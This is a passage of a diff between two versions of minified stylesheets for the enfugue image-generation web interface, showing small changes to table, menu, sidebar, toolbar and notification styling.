-main{background-color:var(--darkest-color);background:radial-gradient(hsla(0,0%,100%,.005) 35%,transparent 36%) 0 0;background-size:4px 4px;color:var(--lightest-color)}table{border-collapse:collapse;margin:0 1em;table-layout:fixed;width:calc(100% - 2em)}table tbody tr td,table tbody tr th,table thead tr th{font-size:11px;height:35px;overflow:hidden;padding:5px 10px;text-overflow:ellipsis;vertical-align:middle;white-space:nowrap}table tbody tr:last-child,table thead tr{border-bottom:1px solid var(--theme-color-tertiary)}table thead tr th{color:var(--theme-color-tertiary);cursor:pointer;font-weight:700;position:relative;text-align:left}table thead tr th.sort:after,table thead tr th.sort:before{display:inline-block;position:absolute}table thead tr th.sort:before{font-family:var(--monospace-font),monospace;right:15px}table thead tr th.sort:after{content:"\f062";font-family:Font Awesome\ 6 Free;right:2px}table thead tr th.sort.sort-reverse:after{content:"\f063"}table thead tr th.sort.sort-0:before{content:"1"}table thead tr th.sort.sort-1:before{content:"2"}table thead tr th.sort.sort-2:before{content:"3"}table thead tr th.sort.sort-3:before{content:"4"}table thead tr th.sort.sort-4:before{content:"5"}table thead tr th.sort.sort-5:before{content:"6"}table thead tr th.sort.sort-6:before{content:"7"}table thead tr th.sort.sort-7:before{content:"8"}table thead tr th.sort.sort-8:before{content:"9"}table tbody tr th{color:#75a1ba;text-align:left}table tbody tr:nth-child(odd){background-color:rgba(0,0,0,.02)}table tbody tr td{font-size:11px}table tbody tr td.empty{font-style:italic;padding:15px;text-align:center}table tbody tr td a.button,table tbody tr td button,table tbody tr td input[type=submit]{width:100%}table tbody tr td a.button.round,table tbody tr td button.round,table tbody tr td input[type=submit].round{border-radius:30px;display:inline-block;height:30px;padding:0;text-align:center;width:30px}table thead tr th.button-column{visibility:hidden}table tbody tr td.button-column,table thead tr th.button-column{padding:0;width:35px}form.login{border:1px solid var(--dark-color);border-radius:5px;display:flex;flex-flow:column nowrap;margin:0 auto;max-width:600px;padding:1em}form.login input{width:100%!important}form.login label{color:var(--theme-color-tertiary);font-size:18px;font-weight:400;margin-bottom:0;margin-top:25px}.code-input-view{height:100%;min-height:200px}.rich-text-input-view{height:calc(100% - 42px)}.ace,.ace_editor{height:100%}.ace,.ace_content,.ace_editor,.ace_layer,.ace_layer>*,.ace_line,.ace_line>*{font-family:monospace}fieldset.field-set-initial-date-range{flex-flow:row nowrap}.civit-ai-view>div:first-child>a{display:block;margin-top:1em;text-align:center}.civit-ai-view>div:first-child>a>img{height:60px}.civit-ai-view>div:first-child>p{padding:1em}.civit-ai-item{align-items:stretch;border:1px solid var(--dark-color);border-radius:5px;display:flex;flex-flow:column nowrap;gap:1em;justify-content:stretch;line-height:1.2em;margin:1em;padding:1em}.civit-ai-item div.flags,.civit-ai-item div.tags,.civit-ai-item div.triggers{display:flex;flex-flow:row nowrap;gap:5px}.civit-ai-item div.triggers{margin-top:5px}.civit-ai-item div.flags>span,.civit-ai-item div.tags>span,.civit-ai-item div.triggers>span{border:2px solid var(--light-color);border-radius:6px;display:block;padding:5px}.civit-ai-item div.flags>span{border-color:var(--theme-color-secondary);color:var(--theme-color-secondary)}.civit-ai-item div.tags>span{border-color:var(--theme-color-tertiary);color:var(--theme-color-tertiary)}.civit-ai-item div.triggers>span{border-color:var(--theme-color-primary);color:var(--theme-color-primary)}.civit-ai-item div.images{align-items:stretch;display:flex;flex-flow:row nowrap;justify-content:flex-start}.civit-ai-item div.images>img{flex-basis:100%;max-height:300px;object-fit:cover;object-position:center top}.civit-ai-item div.downloads{border-collapse:collapse;display:table;margin-top:5px;width:100%}.civit-ai-item div.downloads div.download{display:table-row}.civit-ai-item div.downloads div.download:not(:last-child){border-bottom:1px solid var(--theme-color-secondary)}.civit-ai-item div.downloads div.download>*{display:table-cell;padding:5px}.civit-ai-item h2{margin:0}
+main{background-color:var(--darkest-color);background:radial-gradient(hsla(0,0%,100%,.005) 35%,transparent 36%) 0 0;background-size:4px 4px;color:var(--lightest-color)}table{border-collapse:collapse;margin:0 1em;table-layout:fixed;width:calc(100% - 2em)}table tbody tr td,table tbody tr th,table thead tr th{font-size:11px;height:35px;overflow:hidden;padding:5px 10px;text-overflow:ellipsis;vertical-align:middle;white-space:nowrap}table tbody tr:last-child,table thead tr{border-bottom:1px solid var(--theme-color-tertiary)}table thead tr th{color:var(--theme-color-tertiary);cursor:pointer;font-weight:700;position:relative;text-align:left}table thead tr th.sort:after,table thead tr th.sort:before{display:inline-block;position:absolute}table thead tr th.sort:before{font-family:var(--monospace-font),monospace;right:15px}table thead tr th.sort:after{content:"\f062";font-family:Font Awesome\ 6 Free;right:2px}table thead tr th.sort.sort-reverse:after{content:"\f063"}table thead tr th.sort.sort-0:before{content:"1"}table thead tr th.sort.sort-1:before{content:"2"}table thead tr th.sort.sort-2:before{content:"3"}table thead tr th.sort.sort-3:before{content:"4"}table thead tr th.sort.sort-4:before{content:"5"}table thead tr th.sort.sort-5:before{content:"6"}table thead tr th.sort.sort-6:before{content:"7"}table thead tr th.sort.sort-7:before{content:"8"}table thead tr th.sort.sort-8:before{content:"9"}table tbody tr th{color:#75a1ba;text-align:left}table tbody tr:nth-child(odd){background-color:rgba(0,0,0,.02)}table tbody tr td{font-size:11px}table tbody tr td.empty{font-style:italic;padding:15px;text-align:center}table tbody tr td a.button,table tbody tr td button,table tbody tr td input[type=submit]{width:100%}table tbody tr td a.button.round,table tbody tr td button.round,table tbody tr td input[type=submit].round{border-radius:30px;display:inline-block;height:30px;padding:0;text-align:center;width:30px}table thead tr th.button-column{visibility:hidden}table tbody tr td.button-column,table thead tr th.button-column{padding:0;width:35px}form.login{border:1px solid var(--dark-color);border-radius:5px;display:flex;flex-flow:column nowrap;margin:0 auto;max-width:600px;padding:1em}form.login input{width:100%!important}form.login label{color:var(--theme-color-tertiary);font-size:18px;font-weight:400;margin-bottom:0;margin-top:25px}.code-input-view{height:100%;min-height:200px}.rich-text-input-view{height:calc(100% - 42px)}.ace,.ace_editor{height:100%}.ace,.ace_content,.ace_editor,.ace_layer,.ace_layer>*,.ace_line,.ace_line>*{font-family:monospace}.civit-ai-view>div:first-child>a{display:block;margin-top:1em;text-align:center}.civit-ai-view>div:first-child>a>img{height:60px}.civit-ai-view>div:first-child>p{padding:1em}.civit-ai-item{align-items:stretch;border:1px solid var(--dark-color);border-radius:5px;display:flex;flex-flow:column nowrap;gap:1em;justify-content:stretch;line-height:1.2em;margin:1em;padding:1em}.civit-ai-item div.flags,.civit-ai-item div.tags,.civit-ai-item div.triggers{display:flex;flex-flow:row nowrap;gap:5px}.civit-ai-item div.triggers{margin-top:5px}.civit-ai-item div.flags>span,.civit-ai-item div.tags>span,.civit-ai-item div.triggers>span{border:2px solid var(--light-color);border-radius:6px;display:block;padding:5px}.civit-ai-item div.flags>span{border-color:var(--theme-color-secondary);color:var(--theme-color-secondary)}.civit-ai-item div.tags>span{border-color:var(--theme-color-tertiary);color:var(--theme-color-tertiary)}.civit-ai-item div.triggers>span{border-color:var(--theme-color-primary);color:var(--theme-color-primary)}.civit-ai-item div.images{align-items:stretch;display:flex;flex-flow:row nowrap;justify-content:flex-start}.civit-ai-item div.images>img{flex-basis:100%;max-height:300px;object-fit:cover;object-position:center top}.civit-ai-item div.downloads{border-collapse:collapse;display:table;margin-top:5px;width:100%}.civit-ai-item div.downloads div.download{display:table-row}.civit-ai-item div.downloads div.download:not(:last-child){border-bottom:1px solid var(--theme-color-secondary)}.civit-ai-item div.downloads div.download>*{display:table-cell;padding:5px}.civit-ai-item h2{line-height:1em;margin:0}
```

### Comparing `enfugue-0.1.3/enfugue/static/css/08-enfugue.min.css` & `enfugue-0.2.0/enfugue/static/css/08-enfugue.min.css`

 * *Files 3% similar despite different names*

```diff
@@ -1 +1 @@
-enfugue-application{display:block;height:100%;left:0;position:absolute;top:0;width:100%}enfugue-application>enfugue-node-editor{bottom:0;height:auto;left:0;position:absolute;right:0;top:35px;width:auto}enfugue-application>enfugue-node-editor.image-editor{bottom:30px;left:40px;right:300px;z-index:3}enfugue-application>enfugue-node-editor.windows{z-index:5}enfugue-menu{align-items:stretch;background-color:var(--dark-color);border-bottom:1px solid rgba(0,0,0,.2);display:flex;flex-flow:row nowrap;height:35px;left:0;line-height:35px;position:absolute;right:0;text-shadow:1px 1px 0 rgba(0,0,0,.2);top:0;z-index:6}enfugue-menu-category{background-color:transparent;border-right:1px solid rgba(0,0,0,.2);cursor:pointer;font-weight:100;width:80px}enfugue-menu-category:hover{background-color:hsla(0,0%,100%,.1)}enfugue-menu>enfugue-menu-category:not(:first-of-type){border-left:1px solid hsla(0,0%,100%,.1)}enfugue-menu-category-header,enfugue-menu-item{font-family:var(--monospace-font),monospace;padding:0 5px}enfugue-menu-item{align-items:center;background-color:var(--dark-color);border-color:hsla(0,0%,100%,.1) rgba(0,0,0,.2) rgba(0,0,0,.2) hsla(0,0%,100%,.1);border-style:solid;border-width:1px;color:var(--theme-color-tertiary);cursor:pointer;display:flex;flex-direction:row-reverse;flex-wrap:nowrap;font-size:14px;font-weight:200;justify-content:space-between;width:200px}enfugue-menu-category:not(.active)>enfugue-menu-item{display:none}enfugue-menu-category>enfugue-menu-item:first-of-type{margin-top:-1px}enfugue-menu-item:hover{color:var(--lightest-color)}enfugue-menu-item.active{border-bottom-color:var(--theme-color-tertiary)}enfugue-menu-item i{font-size:18px}enfugue-sidebar{align-items:stretch;background-color:var(--dark-color);border-bottom:1px solid rgba(0,0,0,.2);border-left:1px solid hsla(0,0%,100%,.1);border-top:1px solid hsla(0,0%,100%,.1);bottom:30px;display:flex;flex-flow:column nowrap;flex-grow:0;flex-shrink:0;justify-content:flex-start;overflow-y:auto;position:absolute;right:0;top:35px;width:300px}enfugue-sidebar::-webkit-scrollbar{background:var(--dark-color)}enfugue-sidebar::-webkit-scrollbar-thumb{background-color:rgba(0,0,0,.55)}enfugue-sidebar::-webkit-scrollbar-thumb:hover{background-color:rgba(0,0,0,.7)}enfugue-sidebar input.invoke{margin:auto 1em 1em}enfugue-sidebar .invoke-loader{margin:-16px 2px 16px;pointer-events:none}enfugue-sidebar .invoke-loader.loading-bar:after{border-bottom-left-radius:4px;border-bottom-right-radius:4px;border-top-left-radius:0;border-top-right-radius:0}enfugue-toolbar{background-color:var(--dark-color);border-right:1px solid rgba(0,0,0,.2);border-top:1px solid hsla(0,0%,100%,.1);bottom:30px;flex-flow:column nowrap;justify-content:flex-start;left:0;padding:0;position:absolute;top:35px;z-index:3}enfugue-toolbar,enfugue-toolbar-item{align-items:center;border-bottom:1px solid rgba(0,0,0,.2);display:flex;width:40px}enfugue-toolbar-item{cursor:pointer;flex-flow:row nowrap;height:40px;justify-content:center;position:relative}enfugue-toolbar enfugue-toolbar-item:not(:first-child){border-top:1px solid hsla(0,0%,100%,.1)}enfugue-toolbar-item>span{display:none}enfugue-toolbar-item>i{font-size:25px}enfugue-toolbar-item:after{background-color:hsla(0,0%,100%,0);bottom:0;content:"\A";display:block;left:0;position:absolute;right:0;top:0}enfugue-toolbar-item:not(.disabled):not(:disabled):hover:after{background-color:hsla(0,0%,100%,.1)}enfugue-toolbar-item:not(.disabled):not(:disabled):active{border-bottom:1px solid rgba(0,0,0,.2)}enfugue-tabbed-view{display:block}enfugue-tabs{align-items:stretch;display:flex;flex-flow:row nowrap;justify-content:stretch}enfugue-tabs enfugue-tab{align-items:center;background-color:transparent;color:var(--theme-color-secondary);cursor:pointer;display:flex;flex-flow:row nowrap;flex-grow:0;font-family:var(--header-font);font-size:15px;font-weight:300;justify-content:center;padding:.75em;transition:background-color .25s ease-in-out,color .25s ease-in-out;transition:all .25s ease-in-out}enfugue-tabs enfugue-tab.active{background-color:var(--theme-color-secondary);color:var(--lightest-color);flex-grow:1;font-weight:700}enfugue-tab-content{border-top:3px solid var(--theme-color-secondary);display:block}enfugue-sidebar-category-header,enfugue-sidebar-item{align-items:center;border-bottom:1px solid rgba(0,0,0,.2);border-top:1px solid hsla(0,0%,100%,.15);color:var(--theme-color-secondary);cursor:pointer;display:flex;flex-direction:row;flex-wrap:nowrap;font-size:14px;font-weight:700;height:45px;padding:0 10px;position:relative;text-transform:uppercase}enfugue-sidebar-category-header:before,enfugue-sidebar-item:before{background-color:#000;bottom:0;content:"\A";display:block;left:0;opacity:0;pointer-events:none;position:absolute;right:0;top:0;transition:opacity .2s ease-in-out}enfugue-sidebar-category-header:hover:before,enfugue-sidebar-item:hover:before{opacity:.1}enfugue-sidebar-category-header:after{content:"\f054";flex-grow:1;font-family:Font Awesome\ 6 Free;font-weight:900;text-align:right}enfugue-sidebar-category.active>enfugue-sidebar-category-header:after{content:"\f078"}enfugue-sidebar-category-header enfugue-sidebar-category-button{cursor:pointer;font-size:16px;margin-left:10px;opacity:.75;transition:opacity .25s ease-in-out}enfugue-sidebar-category-header enfugue-sidebar-category-button:hover{opacity:1}enfugue-sidebar-item{background-color:var(--theme-color-primary);flex-direction:row-reverse}enfugue-menu-item.loading-bar:after,enfugue-sidebar-item.loading-bar:after{bottom:3px;height:5px;margin-left:-5px;margin-right:-5px}enfugue-sidebar-item.disabled{background-color:#aaa}enfugue-sidebar-item i{flex-grow:1;font-size:18px;text-align:right}enfugue-notification-center{bottom:0;display:flex;flex-flow:column-reverse nowrap;justify-content:flex-start;left:66%;pointer-events:none;position:fixed;right:0;top:0;z-index:6}enfugue-notification{backdrop-filter:blur(10px);background-color:rgba(0,0,0,.4);border:1px solid var(--darker-color);border-radius:2px;box-shadow:2px 2px 8px rgba(0,0,0,.3);color:var(--light-color);display:flex;flex-flow:column nowrap;height:150px;margin:1em;padding:1em;pointer-events:auto;position:relative;transition:all .5s ease-in-out}enfugue-notification i{cursor:pointer;font-size:18px;opacity:.75;position:absolute;right:1em;top:11px;transition:opacity .25s ease-in-out}enfugue-notification i:hover{opacity:1}enfugue-notification p{flex-basis:100%;font-size:13px;overflow-y:auto}enfugue-notification.hiding{height:0;margin:0 1em;opacity:0;padding:0 1em}enfugue-notification.hiding,enfugue-notification.hiding p{overflow:hidden}enfugue-notification h2{border-bottom:1px solid var(--lightest-color);color:var(--lightest-color);font-size:24px;font-weight:700;margin-bottom:.5em;text-transform:uppercase}enfugue-notification:not(:last-child){margin-top:0}enfugue-notification.info h2{border-color:rgba(92,184,92,.9);color:rgba(92,184,92,.75)}enfugue-notification.warn h2{border-color:rgba(240,173,78,.9);color:rgba(240,173,78,.75)}enfugue-notification.error h2{border-color:rgba(217,83,79,.9);color:rgba(217,83,79,.75)}enfugue-color-input,enfugue-repeatable-input,enfugue-search-list{align-items:center;background-color:var(--darker-color);border:1px solid #000;border-radius:5px;display:flex;flex-flow:row wrap;gap:5px;outline:none;padding:5px;position:relative;width:100%}enfugue-color-input{flex-flow:row nowrap}enfugue-search-list>enfugue-search-list-selection{align-items:center;background-color:var(--theme-color-primary);border-left:3px solid transparent;border-radius:2px;border-right:3px solid transparent;box-sizing:border-box;color:var(--lightest-color);display:flex;flex-flow:row nowrap;font-size:12px;justify-content:center;opacity:1;padding:5px 10px 5px 5px;position:relative;transition:border-color .1s ease-in-out,opacity .25s ease-in-out}enfugue-search-list>enfugue-search-list-selection span{font-weight:700}enfugue-search-list>enfugue-search-list-selection.dragged{opacity:.5}enfugue-search-list>enfugue-search-list-selection.drop-left{border-left:3px solid var(--dark-color)}enfugue-search-list>enfugue-search-list-selection.drop-right{border-right:3px solid var(--dark-color)}enfugue-search-list>enfugue-search-list-selection>button{background-color:var(--lightest-color);border-radius:20px;border-width:0;color:var(--theme-color-primary);height:15px;line-height:0;margin-right:5px;padding:0;width:15px}enfugue-search-list>enfugue-search-list-selection>button:not(:disabled):not(.disabled):hover{background-color:var(--theme-color-primary);color:var(--lightest-color)}enfugue-color-input>input,enfugue-search-list>input{border:none;flex-grow:1;margin:0;padding:5px}enfugue-color-input>.inline-color-preview{border:1px solid #000;border-radius:5px;cursor:pointer;height:20px;width:20px}enfugue-color-input-helper-view,ul.enfugue-search-list-items{background-color:var(--darker-color);border:1px solid var(--darkest-color);border-bottom-left-radius:5px;border-bottom-right-radius:5px;border-top:none;color:var(--light-color);max-height:400px;max-height:250px;min-height:40px;overflow-y:auto;position:fixed;z-index:10}enfugue-color-input-helper-view .preview-input-container{align-items:stretch;display:flex;flex-flow:row nowrap;gap:5px;justify-content:stretch;padding:5px}enfugue-color-input-helper-view .preview-input-container .preview{align-items:center;display:flex;flex-basis:25%;flex-flow:column nowrap;font-weight:700;gap:1em;justify-content:center;text-transform:uppercase}enfugue-color-input-helper-view .preview-input-container .input-container{align-items:center;display:flex;flex-basis:100%;flex-flow:column nowrap;gap:5px;justify-content:center}enfugue-color-input-helper-view .preview-input-container .input-container .input-part,enfugue-color-input-helper-view .preview-input-container .preview{border:1px solid #ccc;border-radius:5px}enfugue-color-input-helper-view .preview-input-container .input-container .input-part{cursor:pointer;height:30px;position:relative;width:100%}enfugue-color-input-helper-view .preview-input-container .input-container .input-part .indicator{border:1px solid #ccc;bottom:-5px;left:0;margin-left:-5px;pointer-events:none;position:absolute;top:-5px;width:10px}ul.enfugue-search-list-items>li{align-items:center;background-color:var(--darker-color);cursor:pointer;display:flex;flex-flow:row nowrap;font-size:12px;justify-content:flex-start;padding:.5em;position:relative;transition:all .25s ease-in-out}ul.enfugue-search-list-items>li:hover{background-color:var(--darkest-color)}ul.enfugue-search-list-items>li:not(:last-child){border-bottom:1px solid var(--darkest-color)}ul.enfugue-multi-search-list-items>li:before{border:1px solid #ccc;border-radius:2px;color:var(--theme-color-tertiary);content:"\A";display:block;font-weight:700;height:14px;margin-right:4px;padding:0;text-align:center;vertical-align:middle;width:14px}ul.enfugue-multi-search-list-items>li.selected:before{border-color:var(--theme-color-tertiary);content:"✓"}enfugue-repeatable-input input.add-item{flex-grow:0}enfugue-repeatable-input enfugue-repeatable-input-item{display:block;position:relative;width:100%}enfugue-repeatable-input enfugue-repeatable-input-item input.remove-item{border-radius:15px;height:15px;line-height:0;margin:0;padding:0;position:absolute;right:-2px;text-align:center;top:-2px;width:15px}enfugue-repeatable-input enfugue-repeatable-input-item input.remove-item.disabled{opacity:.33}enfugue-repeatable-input.columns{align-items:stretch;flex-flow:column nowrap}enfugue-repeatable-input.columns enfugue-repeatable-input-item{margin-bottom:5px}enfugue-repeatable-input enfugue-repeatable-input-item>form.inset-form{padding:10px}enfugue-repeatable-input enfugue-repeatable-input-item>form.inset-form fieldset:not(:last-child){margin-bottom:10px}enfugue-repeatable-input enfugue-repeatable-input-item>form.inset-form fieldset .field-container:not(:last-child){margin-bottom:5px}enfugue-repeatable-input enfugue-repeatable-input-item>form{gap:0;margin:0;padding:5px}enfugue-repeatable-input.columns input.add-item{width:calc(100% - 5px)}enfugue-repeatable-input.columns input.remove-item{background-color:#000;border-color:#000}enfugue-repeatable-input.columns input.remove-item:not(:disabled):not(.disabled):hover{color:#000}form.model-picker{align-items:center;display:flex;flex-flow:row nowrap;justify-content:center;left:40px;max-width:calc(100vw - 400px);padding:5px 0 0 5px;position:absolute;top:35px;width:500px;z-index:3}form.model-picker fieldset{width:100%}form.model-picker fieldset legend{display:none}form.model-picker div#tensorrt{cursor:pointer;height:22px;margin-left:-64px;position:relative;transition:all .25s ease-in-out}form.model-picker div#tensorrt img{filter:grayscale(100%);height:22px}form.model-picker div#tensorrt:hover img{filter:grayscale(75%)}form.model-picker div#tensorrt.ready img{filter:grayscale(0)}form.model-picker div#tensorrt span.fraction{border-radius:20px;color:#000;display:block;font-size:10px;height:20px;position:absolute;right:12.1px;text-align:center;top:0;width:20px}form.model-picker div#tensorrt span.fraction:after{background-color:#000;content:"\A";height:1px;left:5px;position:absolute;top:10px;transform:rotate(-62deg);width:10px}form.model-picker div#tensorrt span.fraction>span:first-child{display:block;left:3px;position:absolute;top:2px}form.model-picker div#tensorrt span.fraction>span:last-child{bottom:1px;display:block;position:absolute;right:3px}form.model-picker enfugue-search-list{margin:0}ul.model-picker-list-input-view>li>span{align-items:center;display:flex;flex-flow:row nowrap;height:100%;justify-content:space-between;width:100%}.additional-weights-form-view{left:35px;max-width:calc(100vw - 380px);opacity:.5;position:absolute;top:75px;transition:opacity .25s ease-in-out;width:520px;z-index:4}.additional-weights-form-view:hover{opacity:1}.additional-weights-form-view legend{flex-direction:row-reverse;justify-content:flex-end}.additional-weights-form-view legend:after{margin-right:10px}.page-buttons{align-items:center;display:flex;flex-flow:row nowrap;gap:5px;justify-content:stretch;margin:1em;width:calc(100% - 2em)}.page-buttons>*{flex-basis:100%;text-align:center}enfugue-status{align-items:center;color:var(--light-color);display:flex;flex-flow:row nowrap;font-size:10px;font-weight:900;gap:5px;height:100%;justify-content:space-between;padding:0 5px 0 50px;text-shadow:1px 1px 0 rgba(0,0,0,.8);transition:all .25s ease-in-out}enfugue-status-version:before{content:"VERSION: ";font-weight:200}enfugue-status-uptime:before{content:"UPTIME: ";font-weight:200}enfugue-status-gpu-name:before{content:"GPU: ";font-weight:200}enfugue-status-gpu-load:before{color:var(--light-color);content:"LOAD: ";font-weight:200}enfugue-status-gpu-load:after{content:"%";font-weight:200}enfugue-status-gpu-temp:before{color:var(--light-color);content:"TEMP: ";font-weight:200}enfugue-status-gpu-temp:after{content:"°C";font-weight:200}enfugue-status-gpu-memory:before{content:"MEM: ";font-weight:200}enfugue-status-icon{background-color:var(--dark-color);border:1px solid var(--darkest-color);border-radius:14px;display:inline-block;height:14px;width:14px}enfugue-status-gpu-memory{border:1px solid var(--dark-color);border-radius:4px;display:inline-block;padding:4px}enfugue-status-icon.idle{background-color:#999;cursor:not-allowed}enfugue-status-icon.ready{background-color:#4bb543;cursor:pointer}enfugue-status-icon.error{background-color:#f33;cursor:not-allowed}enfugue-status-icon.busy{background-color:#e9d502;cursor:pointer}enfugue-downloads{display:flex;flex-flow:column-reverse nowrap;gap:1em;padding:1em}enfugue-download{display:flex;flex-flow:column nowrap;gap:2px}enfugue-download-name{color:var(--theme-color-secondary);display:block;font-family:var(--header-font);font-size:1.5em}enfugue-download-progress{border-radius:2px;display:block;height:2px;width:100%}enfugue-download-size,enfugue-download-time{display:block;font-weight:300}enfugue-download-status{background-color:rgba(0,0,0,.6);border-radius:22px;color:hsla(0,0%,100%,.8);cursor:pointer;display:block;height:22px;line-height:22px;margin-left:auto;margin-right:-40px;position:relative;text-align:center;width:22px}enfugue-download-count{background-color:var(--dark-color);border-radius:12px;color:var(--light-color);font-size:10px;height:12px;line-height:12px;position:absolute;right:-2px;text-align:center;top:-2px;width:12px}enfugue-download-status.inactive{background:none!important;opacity:.5}enfugue-scribble-view{bottom:0;cursor:default;display:block;left:0;position:absolute;right:0;top:0;z-index:0}enfugue-scribble-view canvas{image-rendering:pixelated;position:relative;z-index:-1}enfugue-model-table-searching{display:block;margin:0;padding:1em 1em 0 0;text-align:right}enfugue-model-table-searching input{margin:0}enfugue-image-inspector{cursor:default;display:block;overflow:hidden;position:relative;text-align:center}enfugue-image-inspector .image-view-container{display:block;max-height:100%;overflow:hidden}enfugue-image-inspector .down,enfugue-image-inspector .left,enfugue-image-inspector .right,enfugue-image-inspector .up{align-items:center;display:flex;flex-flow:row nowrap;justify-content:center;opacity:0;pointer-events:none;position:absolute;transition:all .25s ease-in-out}enfugue-image-inspector .down.active,enfugue-image-inspector .left.active,enfugue-image-inspector .right.active,enfugue-image-inspector .up.active{font-size:40px;opacity:.5}enfugue-image-inspector .up{background-image:linear-gradient(0deg,transparent,#000);height:40px;left:0;right:0;top:0}enfugue-image-inspector .down{background-image:linear-gradient(180deg,transparent,#000);bottom:0;height:40px;left:0;position:absolute;right:0}enfugue-image-inspector .left{background-image:linear-gradient(270deg,transparent,#000);bottom:0;left:0;position:absolute;top:0;width:40px}enfugue-image-inspector .right{background-image:linear-gradient(90deg,transparent,#000);bottom:0;position:absolute;right:0;top:0;width:40px}enfugue-image-details{color:#000;font-family:var(--monospace-font),monospace;font-size:10px;position:absolute;right:5px;text-align:right;text-shadow:1px 1px 0 #fff;top:107px}enfugue-image-browser{box-shadow:0 0 10px rgba(0,0,0,.6);cursor:pointer;height:100px;opacity:.5;position:absolute;right:5px;top:5px;transition:all .25s ease-in-out}enfugue-image-browser:hover{opacity:1}enfugue-image-browser img{height:100%;pointer-events:none}enfugue-image-browser span{border:1px solid #fff;box-shadow:inset 0 0 1px #000;left:0;margin:0;max-height:100%;max-width:100%;padding:0;pointer-events:none;position:absolute;top:0}
+enfugue-application{display:block;height:100%;left:0;position:absolute;top:0;width:100%}enfugue-application>enfugue-node-editor{bottom:0;height:auto;left:0;position:absolute;right:0;top:35px;width:auto}enfugue-application>enfugue-node-editor.image-editor{bottom:30px;left:40px;right:300px;z-index:3}enfugue-application>enfugue-node-editor.windows{z-index:5}enfugue-menu{align-items:stretch;background-color:var(--dark-color);border-bottom:1px solid rgba(0,0,0,.2);display:flex;flex-flow:row nowrap;height:35px;left:0;line-height:35px;position:absolute;right:0;text-shadow:1px 1px 0 rgba(0,0,0,.2);top:0;z-index:6}enfugue-menu-category{background-color:transparent;border-right:1px solid rgba(0,0,0,.2);cursor:pointer;font-weight:100;width:80px}enfugue-menu-category:hover{background-color:hsla(0,0%,100%,.1)}enfugue-menu>enfugue-menu-category:not(:first-of-type){border-left:1px solid hsla(0,0%,100%,.1)}enfugue-menu-category-header,enfugue-menu-item{font-family:var(--monospace-font),monospace;padding:0 5px}enfugue-menu-item{align-items:center;background-color:var(--dark-color);border-color:hsla(0,0%,100%,.1) rgba(0,0,0,.2) rgba(0,0,0,.2) hsla(0,0%,100%,.1);border-style:solid;border-width:1px;color:var(--theme-color-tertiary);cursor:pointer;display:flex;flex-direction:row-reverse;flex-wrap:nowrap;font-size:14px;font-weight:200;justify-content:space-between;width:200px}enfugue-menu-category:not(.active)>enfugue-menu-item{display:none}enfugue-menu-category>enfugue-menu-item:first-of-type{margin-top:-1px}enfugue-menu-item:hover{color:var(--lightest-color)}enfugue-menu-item.active{border-bottom-color:var(--theme-color-tertiary)}enfugue-menu-item i{font-size:18px}enfugue-sidebar{align-items:stretch;background-color:var(--dark-color);border-bottom:1px solid rgba(0,0,0,.2);border-left:1px solid hsla(0,0%,100%,.1);border-top:1px solid hsla(0,0%,100%,.1);bottom:30px;display:flex;flex-flow:column nowrap;flex-grow:0;flex-shrink:0;justify-content:flex-start;overflow-y:auto;position:absolute;right:0;top:35px;width:300px}enfugue-sidebar::-webkit-scrollbar{background:var(--dark-color)}enfugue-sidebar::-webkit-scrollbar-thumb{background-color:rgba(0,0,0,.55)}enfugue-sidebar::-webkit-scrollbar-thumb:hover{background-color:rgba(0,0,0,.7)}enfugue-sidebar input.invoke{margin:auto 1em 1em}enfugue-sidebar .invoke-loader{margin:-16px 2px 16px;pointer-events:none}enfugue-sidebar .invoke-loader.loading-bar:after{border-bottom-left-radius:4px;border-bottom-right-radius:4px;border-top-left-radius:0;border-top-right-radius:0;content:"\A"!important}enfugue-toolbar{background-color:var(--dark-color);border-right:1px solid rgba(0,0,0,.2);border-top:1px solid hsla(0,0%,100%,.1);bottom:30px;flex-flow:column nowrap;justify-content:flex-start;left:0;padding:0;position:absolute;top:35px;z-index:3}enfugue-toolbar,enfugue-toolbar-item{align-items:center;border-bottom:1px solid rgba(0,0,0,.2);display:flex;width:40px}enfugue-toolbar-item{cursor:pointer;flex-flow:row nowrap;height:40px;justify-content:center;position:relative}enfugue-toolbar enfugue-toolbar-item:not(:first-child){border-top:1px solid hsla(0,0%,100%,.1)}enfugue-toolbar-item>span{display:none}enfugue-toolbar-item>i{font-size:25px}enfugue-toolbar-item:after{background-color:hsla(0,0%,100%,0);bottom:0;content:"\A";display:block;left:0;position:absolute;right:0;top:0}enfugue-toolbar-item:not(.disabled):not(:disabled):hover:after{background-color:hsla(0,0%,100%,.1)}enfugue-toolbar-item:not(.disabled):not(:disabled):active{border-bottom:1px solid rgba(0,0,0,.2)}enfugue-tabbed-view{display:block}enfugue-tabs{align-items:stretch;display:flex;flex-flow:row nowrap;justify-content:stretch}enfugue-tabs enfugue-tab{align-items:center;background-color:transparent;color:var(--theme-color-secondary);cursor:pointer;display:flex;flex-flow:row nowrap;flex-grow:0;font-family:var(--header-font);font-size:15px;font-weight:300;justify-content:center;padding:.75em;transition:background-color .25s ease-in-out,color .25s ease-in-out;transition:all .25s ease-in-out}enfugue-tabs enfugue-tab.active{background-color:var(--theme-color-secondary);color:var(--lightest-color);flex-grow:1;font-weight:700}enfugue-tab-content{border-top:3px solid var(--theme-color-secondary);display:block}enfugue-sidebar-category-header,enfugue-sidebar-item{align-items:center;border-bottom:1px solid rgba(0,0,0,.2);border-top:1px solid hsla(0,0%,100%,.15);color:var(--theme-color-secondary);cursor:pointer;display:flex;flex-direction:row;flex-wrap:nowrap;font-size:14px;font-weight:700;height:45px;padding:0 10px;position:relative;text-transform:uppercase}enfugue-sidebar-category-header:before,enfugue-sidebar-item:before{background-color:#000;bottom:0;content:"\A";display:block;left:0;opacity:0;pointer-events:none;position:absolute;right:0;top:0;transition:opacity .2s ease-in-out}enfugue-sidebar-category-header:hover:before,enfugue-sidebar-item:hover:before{opacity:.1}enfugue-sidebar-category-header:after{content:"\f054";flex-grow:1;font-family:Font Awesome\ 6 Free;font-weight:900;text-align:right}enfugue-sidebar-category.active>enfugue-sidebar-category-header:after{content:"\f078"}enfugue-sidebar-category-header enfugue-sidebar-category-button{cursor:pointer;font-size:16px;margin-left:10px;opacity:.75;transition:opacity .25s ease-in-out}enfugue-sidebar-category-header enfugue-sidebar-category-button:hover{opacity:1}enfugue-sidebar-item{background-color:var(--theme-color-primary);flex-direction:row-reverse}enfugue-menu-item.loading-bar:after,enfugue-sidebar-item.loading-bar:after{bottom:3px;height:5px;margin-left:-5px;margin-right:-5px}enfugue-sidebar-item.disabled{background-color:#aaa}enfugue-sidebar-item 